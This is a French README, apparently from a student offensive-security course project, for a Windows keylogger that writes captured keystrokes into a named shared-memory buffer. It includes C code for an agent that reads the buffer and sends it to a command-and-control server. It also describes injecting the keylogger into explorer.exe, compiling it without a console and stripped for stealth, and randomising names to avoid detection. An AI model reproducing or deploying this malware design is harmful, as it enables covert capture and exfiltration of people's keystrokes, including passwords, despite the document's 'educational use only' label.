# 🔗 Keylogger avec Mémoire Partagée

## 📋 **Vue d'ensemble**

Cette version du keylogger utilise la **mémoire partagée** au lieu d'un fichier sur disque. Les frappes sont stockées dans un buffer circulaire accessible par l'agent.

---

## 🏗️ **Architecture**

```
┌─────────────┐         ┌──────────────────┐         ┌─────────┐
│   Agent     │─Inject─→│  Keylogger       │─Write─→│ Shared  │
│             │         │  (dans process)  │         │ Memory  │
└─────────────┘         └──────────────────┘         └─────────┘
       │                                                    ↑
       └─────────────────Read Periodically─────────────────┘
```

---

## 📦 **Fichiers**

| Fichier | Description |
|---------|-------------|
| `keylogger_shmem.c` | Keylogger qui écrit dans la mémoire partagée |
| `reader_test.c` | Programme de test pour lire la mémoire (simulation agent) |
| `build_shmem.sh` | Script de compilation |

---

## 🚀 **Test manuel**

### **1. Compiler**

```bash
./build_shmem.sh
```

### **2. Lancer le keylogger (Terminal 1)**

```powershell
cd C:\Users\Odessa\Epitech\T-VIR\agent_program\keylogger_payload
.\keylogger_shmem.exe
```

Vous verrez :
```
========================================
  Keylogger with Shared Memory
========================================
[+] Shared memory initialized: Global\KeyloggerSharedMem
[+] Buffer size: 4096 bytes
[+] Installing keyboard hook...
[+] Keyboard hook installed!
[+] Shared memory: Global\KeyloggerSharedMem
[+] Press Ctrl+C to stop
========================================
```

### **3. Lancer le reader (Terminal 2)**

```powershell
.\reader_test.exe
```

Vous verrez :
```
========================================
  Shared Memory Reader (Agent Test)
========================================
[+] Shared memory opened successfully
[+] Memory mapped successfully
[+] Press Ctrl+C to stop
========================================
```

### **4. Taper des touches**

Tapez dans n'importe quelle fenêtre → Les touches apparaissent dans le **Terminal 2** !

---

## 🔧 **Intégration avec l'agent**

### **Structure de la mémoire partagée**

```c
typedef struct {
    volatile LONG write_index;    // Index d'écriture (keylogger)
    volatile LONG read_index;     // Index de lecture (agent)
    volatile LONG is_active;      // 1 = actif, 0 = arrêté
    char buffer[4096];            // Buffer circulaire
} SharedKeyloggerData;
```

### **Code pour l'agent (lecture)**

```c
// 1. Ouvrir la mémoire partagée
HANDLE hMapFile = OpenFileMappingA(
    FILE_MAP_ALL_ACCESS,
    FALSE,
    "Global\\KeyloggerSharedMem"
);

// 2. Mapper la vue
SharedKeyloggerData* pData = (SharedKeyloggerData*)MapViewOfFile(
    hMapFile,
    FILE_MAP_ALL_ACCESS,
    0, 0,
    sizeof(SharedKeyloggerData)
);

// 3. Lire les données
LONG write_idx = pData->write_index;
LONG read_idx = pData->read_index;

char result[4096];
int result_len = 0;

while (read_idx != write_idx) {
    result[result_len++] = pData->buffer[read_idx];
    read_idx = (read_idx + 1) % 4096;
}

// 4. Mettre à jour l'index de lecture
InterlockedExchange(&pData->read_index, read_idx);

// 5. Envoyer result au C2
send_to_c2(agent_id, "keylogger", result, result_len);

// 6. Cleanup
UnmapViewOfFile(pData);
CloseHandle(hMapFile);
```

---

## 📊 **Workflow complet**

### **1. Agent injecte le keylogger**

```c
// L'agent injecte keylogger_shmem.exe dans explorer.exe
perform_injection("explorer.exe", keylogger_payload, payload_size);
```

### **2. Keylogger crée la mémoire partagée**

```c
// Nom : "Global\\KeyloggerSharedMem"
// Taille : 4096 bytes
```

### **3. Agent lit périodiquement (toutes les 10 secondes)**

```c
// Ouvrir la mémoire partagée
// Lire depuis read_index jusqu'à write_index
// Envoyer au C2
// Mettre à jour read_index
```

### **4. Agent peut arrêter le keylogger**

```c
pData->is_active = 0;  // Le keylogger se terminera
```

---

## 🎯 **Avantages de cette approche**

✅ **Pas de fichier sur disque** → Moins détectable
✅ **Communication directe** → Agent ↔ Keylogger
✅ **Buffer circulaire** → Pas de fuite mémoire
✅ **Atomique** → `InterlockedExchange` pour thread-safety
✅ **Flexible** → Agent contrôle la lecture

---

## 🔒 **Considérations de sécurité**

⚠️ Le nom `"Global\\KeyloggerSharedMem"` est visible avec des outils comme Process Explorer
⚠️ Peut être randomisé : `sprintf(name, "Global\\Mem%08X", rand());`
⚠️ Les données ne sont pas chiffrées dans la mémoire partagée

---

## 🧪 **Compilation pour production**

```bash
# Sans console (furtif)
x86_64-w64-mingw32-gcc keylogger_shmem.c -o keylogger.exe \
    -mwindows \
    -O2 \
    -s \
    -static \
    -luser32 \
    -lkernel32

# Convertir en bytes hex pour le C2
python3 exe_to_bytes.py keylogger.exe keylogger_payload.txt
```

---

## 📝 **TODO pour l'intégration complète**

- [ ] Ajouter la logique de lecture dans l'agent
- [ ] Implémenter l'envoi automatique au C2 toutes les X secondes
- [ ] Randomiser le nom de la mémoire partagée
- [ ] (Optionnel) Chiffrer les données dans le buffer
- [ ] Gérer la commande Stop pour terminer le keylogger

---

## 🎓 **Ressources**

- [CreateFileMapping Documentation](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga)
- [MapViewOfFile Documentation](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile)
- [Shared Memory in Windows](https://docs.microsoft.com/en-us/windows/win32/memory/creating-named-shared-memory)

---

**Projet EPITECH T-VIR - CTF Sécurité Offensive**
Usage éducatif uniquement
